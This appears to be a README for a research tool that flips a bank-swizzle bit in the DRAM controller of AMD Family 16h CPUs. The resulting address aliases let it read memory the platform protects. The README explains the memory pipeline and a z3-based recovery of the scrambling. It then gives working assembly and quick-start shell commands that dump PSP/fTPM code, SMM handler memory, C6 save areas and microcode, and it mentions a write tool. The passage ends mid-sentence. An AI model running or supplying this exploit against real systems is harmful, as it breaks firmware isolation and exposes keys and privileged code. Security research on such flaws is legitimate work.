# skitter-creek-bath-salts

> *Unlocking **everything** on the CPU with DRAM scrambling — PSP, C6, microcode,
> SMM, and anything else the specs left out.*

`&x == &x`.

Usually.

![Unspaghettifying DRAM](examples/unspaghettify.gif)

Poke the DRAM controller and an address can be made to land wherever you want in
memory. `skitter-creek-bath-salts` modifies the bottom layers of the memory
hierarchy to rewire the physical DRAM address translations. This scrambles
platform memory, exposing protected regions of DRAM — carveouts invisible even
to the kernel. When the address translations break, so do the security
primitives built on them, and we unlock *everything*.

---

## TL;DR

- [Unlock your Platform Security Processor](#quick-start-unlock-your-platform-security-processor)
- [Unlock System Management Mode](#quick-start-unlock-system-management-mode)
- [Unlock C6 DRAM](#quick-start-unlock-cc6-dram)
- [Unlock your CPU microcode](#quick-start-unlock-your-cpu-microcode)

---

## Target

Developed and tested on **AMD Family 16h CPUs**, the last generation whose
datasheets document the DRAM controller's translation registers — and show that
they can't be locked. 17h and beyond simply leave this information out. The
[odyssey of `*p`](#the-odyssey-of-p) is similar across generations and
architectures, and the underlying transforms extend even to ARM, RISC-V, and
beyond; `skitter-creek-bath-salts` shows us [**only how to begin**](#the-shared-pipeline).

---

## The odyssey of `*p`

> *It's a long way down.*

Memory is built on layers of abstraction so deep they become almost absurd. When
your code dereferences `*p`, it appears to access the DRAM at `p`. It does not —
`p` is a virtual address, and before a single bit of DRAM is touched, it must
survive the gauntlet below:

```
         ── CPU core / MMU ─────────────────────────────────────────────────
       ┌─ VA                                                  ← 64-bit virtual address from load/store
       │
       └> canonical-form check ──────────────────────┐        ← bits [63:48] sign-extend from bit 47
       ┌─ segment base add <─────────────────────────┘        ← FS.base / GS.base (MSR_FS_BASE, MSR_GS_BASE)
       │
       └> TLB probe ─────────────────────────────────┐        ← tagged by PCID (host) / VPID (guest)
              hit  → physical address k              │
              miss → engage hardware page walker     │
       ┌─ page walk (from CR3) <─────────────────────┘        ← walked only on TLB miss
       │      PML5[VA 56:48]                                  ← only if CR4.LA57
       │      PML4[VA 47:39]
       │      PDPT[VA 38:30]                                  ← 1 GiB leaf possible
       │      PD  [VA 29:21]                                  ← 2 MiB leaf possible
       │      PT  [VA 20:12]
       │      PTE                                             ← R/W · U/S · NX · A/D · PAT · PCD · PWT · G
       │
       └> per-level checks ──────────────────────────┐        ← evaluated at every level of the walk
              privilege (U/S)                        │        ← CPL vs PTE.U/S
              write    (R/W)                         │        ← + CR0.WP
              execute  (NX)                          │        ← EFER.NXE
              SMEP / SMAP                            │        ← CR4.SMEP · CR4.SMAP · EFLAGS.AC
              protection keys                        │        ← PKRU (user) · IA32_PKRS (supervisor)
       ┌─ A/D bit update <───────────────────────────┘        ← locked RMW on PTE
       │
       └> if guest: EPT / NPT re-walk ───────────────┐        ← each guest-PA above re-walked
              EPT-PML4 → EPT-PDPT → EPT-PD → EPT-PT  │        ← + EPT memory-type override
              ⇒ ~5× walks per single guest walk      │
       ┌─ TLB shootdown IPIs <───────────────────────┘        ← invlpg broadcast to peer vCPUs
       │
       │ ── IOMMU  (chipset / I/O fabric) ──────────────────────────────────
       │
       └> if device-initiated, IOMMU page walk ──────┐        ← VT-d / AMD-Vi: device-ID → domain → tables
                                                     │
       ┌──  **physical address k** <─────────────────┘
       │
       │ ── CPU core / MMU — memory-type resolution ────────────────────────
       │
       └> MTRR range match ──────────────────────────┐        ← IA32_MTRR_DEF_TYPE + fixed/variable MTRRs
       ┌─ PAT entry select <─────────────────────────┘        ← IA32_PAT[ PTE.PAT:PCD:PWT ]
       │
       └> effective memory type ─────────────────────┐        ← { WB, WT, WC, WP, UC-, UC }
                                                     │
         ── CPU uncore — caches & coherence ────────────────────────────────
                                                     │
       ┌─ L1-D probe <───────────────────────────────┘        ← VIPT, per-core
       │
       └> L2 probe ──────────────────────────────────┐        ← per-core / per-CCX
       ┌─ LLC probe + directory consult <────────────┘        ← shared, sliced
       │
       └> snoop / coherence ─────────────────────────┐        ← MESI / MOESI broadcast
              intra-socket                           │        ← broadcast to peer cores
              inter-socket                           │        ← QPI · UPI · Infinity Fabric · CXL.cache
              home-node directory response           │        ← data | intervention | abort
                                                     │
         ── system data fabric / interconnect ──────────────────────────────
                                                     │
       ┌─ if MMIO range or sub-4 GiB MMIO hole <─────┘        ← uncore/data fabric posted/non-posted txn
       │      → device BAR; done
       │
       └> else DRAM-bound: data fabric / mesh ───────┐        ← AMD DF · Intel mesh-or-ring uncore
                                                     │
  ┏━━      ── MCT / IMC (memory controller) ────────────────────────────────
W ┃    ┌─ DRAM hole remap <──────────────────────────┘        ← high-memory remap above TOM
E ┃    │
  ┃    └> memory-region exclusion remap ─────────────┐        ← reserved / protected ranges
  ┃    ┌─ channel interleave hash <──────────────────┘        ← XOR of selected PA bits → channel
A ┃    │
R ┃    └> rank interleave hash ──────────────────────┐        ← XOR of selected PA bits → rank
E ┃    ┌─ bank interleave hash <─────────────────────┘        ← XOR of selected PA bits → bank
  ┃    │
  ┃    └> bank swizzle / XOR scramble ───────────────┐        ← vendor- and BIOS-configurable
H ┃    ┌─ chip-select normalize (DCT) <──────────────┘        ← per-rank CS line
E ┃    │      rank → CS map
R ┃    │
E ┃    └> sub-channel select ────────────────────────┐        ← DDR5 / LPDDR5 only
  ┗━━                                                │
                                                     │
          DRAM coordinates <─────────────────────────┘        ← bank group · bank · row (RAS) · column (CAS)
```

This project works at the deepest levels of the `*p` pipeline, the MCT/DCT layer
— where a physical address from the data fabric/interconnect enters the memory
controller and is rewritten one final time into the raw DRAM coordinates that are
issued to the DIMM.

---

## Spaghettifying DRAM

> Physical addresses are really more of a suggestion.

```nasm
xor dword [0xf80c2094], 0x00400000
```

That's the exploit. All of it.

One bit-flip in the DRAM controller rewires the bottom of the `*p` pipeline, and
the data that was at `&x` is now somewhere else mid-flight. Suddenly `&x != &x`.
Every mechanism the CPU, firmware, uncore, and chipset use to wall off protected
memory sits above the memory controller, and none of it sees what happens below.
The fences guard physical addresses, not DRAM coordinates; rearrange the
coordinates and the barriers above never notice.

But rewiring DRAM is easy. The bit above is the bank-swizzle-mode in the DCT,
and it's just one of dozens that control the address remaps at the final layer —
all you have to do is poke them to make everything built on top topple.  The
harder part then is keeping the platform up as the entirety of system memory is
scrambled underneath it.

The trick: be fast, and *don't touch DRAM*. Disable the APs, prime the
TLBs, warm the cache, disable interrupts, flush the target, serialize memory
accesses, and hope the CPU prefetched the upcoming instructions. Then rewire
the MCT/DCT to spaghettify DRAM, grab some data from the protected region,
revert the mappings, serialize again, enable interrupts, resume the APs, and the
platform is back to normal.

```nasm
mov eax, [0xf80c2094]          ; prime mmio TLB
mov eax, [0x6f800000]          ; prime target TLB
pushf                          ; preserve flags
cli                            ; interrupts off
clflush [0x6f800000]           ; evict the target, force the dram read
mfence                         ; barrier - no coherent world dram access
lfence                         ;   reordered into spaghettified view
xor dword [0xf80c2094], 1<<22  ; flip dct swizzle → spaghettify dram
mov ebx, [0x6f800000]          ; fetch target in spaghettified view
xor dword [0xf80c2094], 1<<22  ; restore dct swizzle → unscramble
mfence                         ; barrier - no spaghettified dram access
lfence                         ;   reordered into coherent world view
popf                           ; interrupts back on
```

With some careful setup of paging, cache states, threading, and the TLBs, the
address scrambling can be made to work from C, to illustrate the `*p` pipeline
collapsing, and the platform's corrupted view when suddenly `&x != &x`:

![&x manipulation](examples/address.gif)

So we can rewire the map and restore it without a trace. All that's left is
knowing what we rewired it into.

---

## Unlocking *everything*

> Every protected memory region on the platform, reachable with a calculator.

With the above approach, we can reprogram the MCT/DCT transform on a running
system — rearranging the lowest stage of the `*p` pipeline to scramble memory
out from underneath every protection built above it.

But there's a challenge: while we can reprogram the translation with a simple
`xor dword [0xf80c2094], 0x00400000`, we have no idea what new transforms the
MCT/DCT will use (the datasheets are underspecified here — the xor maps are off,
the MMIO subtractive stage is unordered, and details vary across models).
Without this, memory scrambles, but we have no way to reconstruct it.

Fortunately, the DRAM controller's address transform is a GF(2) linear map,
which means we can reconstruct the scrambled memory with basic linear algebra.

First, consider the normal case: the forward transform of the default MCT/DCT
configuration gets applied to some physical address, which lands on a secret
in DRAM:

```
    ┌                                 ┐   ┌   ┐     ┌   ┐
    │ 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 1 0 0 1 0 0 1 0 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 1 │
    │ 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 │ · │ 1 │  =  │ 1 │
    │ 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 │   │ 0 │     │ 0 │
    └                                 ┘   └   ┘     └   ┘
                M_firmware               target     secret
```

This is the *coherent* view of memory: the lowest stage of the `*p` pipeline
operates exactly as it should.

Now rewire the MCT/DCT stage of `*p` with `xor dword [0xf80c2094], 0x00400000`,
and the platform enters a scrambled/spaghettified view of memory where a
different transform allows an *alias* to reach the same DRAM secret:

```
    ┌                                 ┐   ┌   ┐     ┌   ┐
    │ 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 1 │
    │ 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 1 0 0 1 0 0 1 0 0 │   │ 1 │     │ 0 │
    │ 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 1 │
    │ 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 1 │
    │ 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 │ · │ 0 │  =  │ 1 │
    │ 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 │   │ 0 │     │ 0 │
    └                                 ┘   └   ┘     └   ┘
                M_attacker                alias     secret
```

This alias lets us reach the same secret without hitting the existing platform
locks and defenses built for the coherent view. To find the alias, compose the
inverse of the attacking/spaghettified hash with the forward of the
firmware/coherent hash, to get the translation that will reach any secret from
the malicious MCT/DCT configuration:

```
    ┌                                 ┐   ┌                                 ┐   ┌   ┐     ┌   ┐
    │ 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 0 1 0 0 1 0 0 1 0 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 │   │ 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 │   │ 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 1 │
    │ 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 │   │ 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 1 │ · │ 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 │ · │ 1 │  =  │ 0 │
    │ 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 │   │ 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 │   │ 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 │   │ 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 │   │ 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 │   │ 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 │   │ 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 │   │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 │   │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 │   │ 0 │     │ 0 │
    └                                 ┘   └                                 ┘   └   ┘     └   ┘
               M_attacker⁻¹                              M_firmware             target    alias
```

The only challenge is that the matrices are unknown, which means we have *no
idea* how memory is actually scrambled, and no transform to use to reach the
secret in the first place:

```
    ┌                                 ┐   ┌                                 ┐   ┌   ┐     ┌   ┐
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 1 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │ · │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │ · │ 1 │  =  │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 1 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? ? │   │ 0 │     │ ? │
    └                                 ┘   └                                 ┘   └   ┘     └   ┘
               M_attacker⁻¹                              M_firmware             target    alias
```

Fortunately, at this point it's just linear algebra, and you could solve the
transforms by hand if you want. Or: a calculator.

We use [z3](https://github.com/z3prover/z3). First, the SMT solver needs
constraints to work with.

Start in the coherent view, modify the MCT/DCT to switch to the spaghettified view,
drop some sentinel value like `0xdeadc0de` into a random address in memory,
flip back to the coherent view, and sweep memory for where the sentinel
resurfaces. This gives a (target, alias) pair — a concrete datapoint showing two
physical addresses that map to the same cell in DRAM. Repeat the process,
gather a handful of data, pass it to z3, and it solves the translation matrix
needed to convert between the two views — any coherent-view physical address on
one side, its spaghettified-view alias on the other:

```
    ┌                                 ┐   ┌   ┐     ┌   ┐
    │ 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 1 0 0 1 0 0 1 0 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 1 │
    │ 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 │   │ 0 │     │ 1 │
    │ 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 1 │ · │ 1 │  =  │ 0 │
    │ 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 │   │ 1 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 │   │ 0 │     │ 0 │
    │ 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 │   │ 0 │     │ 0 │
    └                                 ┘   └   ┘     └   ┘
         M_attacker⁻¹ ∘ M_firmware        target    alias
```

Feeding alias pairs to z3 one at a time lets us watch the SMT solver decipher
the memory scrambling in real time, as shown in the [opening
image](#skitter-creek-bath-salts).

The solved transform is a rosetta stone: any target address in the coherent view
maps to an alias that reaches the same DRAM in the spaghettified view. To reach
any protected memory, take an address we can't normally touch — PSP private
memory, SMRAM, the C6 idle-state — and run it through the transform to get its
alias.  Then rewire the DCT with `xor dword [0xf80c2094], 0x00400000`, read or
write the alias, and switch back with a second `xor`. The alias's path through
the `*p` pipeline never hits a fence the platform built for the coherent view —
unrestricted access to anything in DRAM.

![unlocking DRAM](examples/dram_unlock.gif)

In the end, everything so carefully walled off — PSP private memory, SMRAM, the
C6 idle-state, inaccessible from the OS, ring-0, sometimes the CPU itself — is
still sitting in the same DRAM capacitors. But the locks were built around the
coherent view of memory, and do nothing against a spaghettified alias reaching
the same cell.

Flip one bit in the final level of the `*p` pipeline, and we've unlocked
everything.

---

## Quick start: unlock your Platform Security Processor

> *Tamper with your PSP, see what happens.*

The fTPM runs on the PSP's own ARM core, in a DRAM carveout right past the
visible top-of-memory. Reach it by aliasing an OS-visible physical address
onto it, pull the bytes out, disassemble.

```sh
# Bail out early on platforms this was never tested on.
./userspace/platform_check || exit 1

# Resolve the PSP DRAM carveout — sets PSP_BASE / PSP_SIZE (0x7f800000 /
# 0x800000 on the test box). Swap 2x4gb for whichever data/maps/ prefix
# matches your DIMMs; one --map per saved map.
eval "$(sudo ./userspace/dram_carveouts --region psp)"
sudo ./userspace/dram_dump --protected-pa $PSP_BASE --length $PSP_SIZE \
    $(printf -- '--map %s ' data/maps/2x4gb_*.map) > psp.bin

# The PSP is an ARM core, so disassemble as Thumb-2. Carve crAmd_ModExp
# (0x64 bytes at PSP_BASE+0x19d4) straight out of the captured image.
objdump -b binary -m armv7 -M force-thumb --adjust-vma=$PSP_BASE \
    --start-address=$((PSP_BASE + 0x19d4)) \
    --stop-address=$((PSP_BASE + 0x19d4 + 0x64)) \
    -D psp.bin
```

```armasm
; crAmd_ModExp — the fTPM's RSA modular-exponentiation routine, recovered intact
; from the PSP's private DRAM.
7f8019d4:  b5f0       push  {r4, r5, r6, r7, lr}
7f8019d6:  b0e5       sub   sp, #404
7f8019de:  2280       movs  r2, #128                  ; 1024-bit operand
7f8019e4:  f7fe ffef  bl    0x7f8009c6                ; import base (aA)
7f8019ee:  a0eb       adr   r0, 0x7f801d9c            ; "crAmd_ModExp aA failed, status = 0x%x"
7f8019f8:  f7fe ffe5  bl    0x7f8009c6                ; import exponent (aB)
7f801a02:  a0f0       adr   r0, 0x7f801dc4            ; "crAmd_ModExp aB failed status = 0x%x"
7f801a18:  f000 fdd4  bl    0x7f8025c4                ; the modexp itself
7f801a20:  a0f2       adr   r0, 0x7f801dec            ; "crAmd_ModExp failed ret=0x%08x, exit"
7f801a22:  f000 fef5  bl    0x7f802810                ; log error
7f801a2e:  f001 e92a  blx   0x7f802c84                ; export result
7f801a36:  bdf0       pop   {r4, r5, r6, r7, pc}
```

That's the PSP's RSA engine — the modexp behind every fTPM signature, and behind
the Miller-Rabin tests that mint its keys — lifted out of memory the PSP is
supposed to own alone, fenced off at the memory controller, opaque even to
ring-0. Modify as you see fit.

---

## Quick start: unlock System Management Mode

> *Read what SMM hides.*

The SMI handler entry vector lives at `SMBASE + 0x8000`. `SMBASE` is in
MSR `0xc0010111`. Read it, pull the bytes through the alias map, and pipe
them straight into a disassembler:

```sh
# Bail out early on platforms this was never tested on.
./userspace/platform_check || exit 1

sudo modprobe msr

# SMBASE is per-core; core 0's lives in MSR 0xc0010111.
SMM_BASE=0x$(sudo rdmsr -p 0 0xc0010111)
SMI_ENTRY=$(( SMM_BASE + 0x8000 ))

# Dump the entry vector through the alias map and disassemble on the fly.
# SMM starts in real mode, so ndisasm gets -b 16. One --map per saved map;
# printf expands the glob into a --map for each (at_swizzle, at_bankswap) combo.
sudo ./userspace/dram_dump --protected-pa $SMI_ENTRY --length 0x40 \
    $(printf -- '--map %s ' data/maps/2x4gb_*.map) | ndisasm -b 16 -
```

```nasm
; SMI entry stub — the first thing a core executes when entering the
; ultra-privileged System Management Mode.
mov si,0x8148           ; SI -> GDT pointer parked at SMBASE+0x8148, just past this stub
o32 lgdt [cs:si]        ; load it (o32 -> full 32-bit base, not real mode's 24-bit form)
mov eax,0x3             ; CR0.PE | CR0.MP
mov cr0,eax             ; flip the core into protected mode
jmp short 0x14          ; near jump to serialize and flush the prefetch queue post-switch
mov ax,0x18             ; GDT selector 0x18 -> flat data segment
mov ss,ax               ; reload SS for protected mode
mov eax,0x6efe2ff8      ; SMM stack top
mov esp,eax             ; install the SMM stack
o32 push byte +0x10     ; far-return frame: CS = code selector 0x10
mov ecx,0xc0010111      ; MSR SMM_BASE
rdmsr                   ; EAX = this core's SMBASE
mov ebx,eax             ; stash SMBASE
add eax,0x803a          ; EAX = SMBASE+0x803a, the 32-bit handler entry
push eax                ; far-return frame: EIP = SMBASE+0x803a
retfd                   ; far-return into 0x10:SMBASE+0x803a — the SMI handler proper
```

Those instructions run in ring -2, the most privileged context on the CPU,
out of memory the chipset is supposed to make unreadable. SMRAM "locked"
turns out to be a polite suggestion when we can talk to the DRAM controller
directly.

Swap `2x4gb` for whichever prefix in `data/maps/` matches your installed
DIMMs (`sudo dmidecode -t memory`). If your topology isn't there, run
`analysis/gather_aliases.py` then `analysis/unspaghettify.py` to bake
your own.

---

## Quick start: unlock C6 DRAM

> *I have no idea what's in here and have never seen it discussed, likely
> internal CPU registers. Have fun.*

When the cores power-gate into C6, each one's full x86 architectural context is
stashed here for restore.

```sh
./userspace/platform_check || exit 1

# Resolve the C6 stash — sets CC6_BASE / CC6_SIZE (0x7f000000 / 0x800000 on the
# test box). Each idle core's state lives in a 16 KiB save area; four cores
# here, at CC6_BASE + {0, 0x4000, 0x8000, 0xc000}.
eval "$(sudo ./userspace/dram_carveouts --region cc6)"
sudo ./userspace/dram_dump --protected-pa $CC6_BASE --length 0x10000 \
    $(printf -- '--map %s ' data/maps/2x4gb_*.map) > cc6.bin

# For example, on this platform IA32_APIC_BASE sits at +0x9b8 in each area.
# Read it from all four cores straight out of the stash:
for c in 0 1 2 3; do
    printf 'core %d  ' $c
    hexdump -C -s $(( c*0x4000 + 0x9b8 )) -n 8 cc6.bin | head -1
done
```

```text
core 0  000009b8  00 09 e0 fe 00 00 00 00  |........|   <- 0xfee00900  enabled, BSP bit set
core 1  000049b8  00 08 e0 fe 00 00 00 00  |........|   <- 0xfee00800  application processor
core 2  000089b8  00 08 e0 fe 00 00 00 00  |........|   <- 0xfee00800  application processor
core 3  0000c9b8  00 08 e0 fe 00 00 00 00  |........|   <- 0xfee00800  application processor
```

One core with the BSP bit set, three without — the boot processor and its three
APs, caught mid-idle with their register state lying in the open.

The more you poke around, the more CPU registers you'll start to find:

| offset | x86 state | core-0 value |
|---|---|---|
| `+0x8b0` | GS / per-cpu base | `0xffff9be4e3600000` |
| `+0x9a0` | CR3 (page-table root) | `0x0fd46000` |
| `+0x9b8` | IA32_APIC_BASE | `0xfee00900` |
| `+0xa38` | variable MTRR (base/mask) | `0x6f000000 / …0800` |
| `+0xb10` | saved RIP | `0xffffffff8f3a0029` |

Of course, those registers are all accessible from ring-0 anyway. The
*fun* part is in all the *other* CPU state sitting there — poking the internal
CPU registers ring-0 can't reach.

---

## Quick start: unlock your CPU microcode

> *What could go wrong?*

When a core drops into C6 its microcode patch RAM — volatile SRAM — goes dark with
the rest of the core. So the C6 stash keeps the loaded patch in DRAM and re-seeds
it on wake. That copy sits at `+0x1800` in each save area, and the alias reaches
it like any other byte.

Grab the microcode copy the CPU stashed in fenced DRAM:

```sh
./userspace/platform_check || exit 1
eval "$(sudo ./userspace/dram_carveouts --region cc6)"

# page 1 of core 0's save area is the live microcode patch body
sudo ./userspace/dram_dump --protected-pa $((CC6_BASE + 0x1800)) --length 0x5f0 \
    $(printf -- '--map %s ' data/maps/2x4gb_*.map) > ucode_ram.bin
```

Match it against known patches:

```sh
# did we find it?
python3 - <<'EOF'
ram = open("ucode_ram.bin", "rb").read()
chunks = [ram[i:i+16] for i in range(0, len(ram)-16, 16) if ram[i:i+16].count(0) <= 12]
for fam in (15, 16, 17, 19):
    uc = open(f"/lib/firmware/amd-ucode/microcode_amd_fam{fam}h.bin", "rb").read()
    print(f"fam{fam}h: {sum(c in uc for c in chunks):2}/{len(chunks)} chunks match")
EOF
```

This is a good sign:

```text
fam15h:  0/94 chunks match
fam16h: 68/94 chunks match     <- the microcode the core is running
fam17h:  0/94 chunks match
fam19h:  0/94 chunks match
```

Extract the ucode triads:

```sh
od -Ax -tx1 -w20 ucode_ram.bin
```

```text
000000 c1 df db eb 28 ac 06 00 f5 ff ff 00 e1 1d 0a f9 ff ef ff 2a
000014 e0 8f 2a c7 ff bf 07 00 ff ff bf 2a e0 1f e0 e7 78 df 7d c0
000028 ff ff cf bf 4c 20 06 00 cf 53 39 00 c0 df db eb fe ff ff 27
   [...]
000370 e1 1f c0 bf ff bf 07 00 ff 81 7f 00 e1 1f c0 bf ff 81 7f 00
*
0005f0
```

And there it is, distinct uops up top, NOP padding repeating below.

From there, `dram_dump` has a sibling tool, `dram_poke`. The same alias that
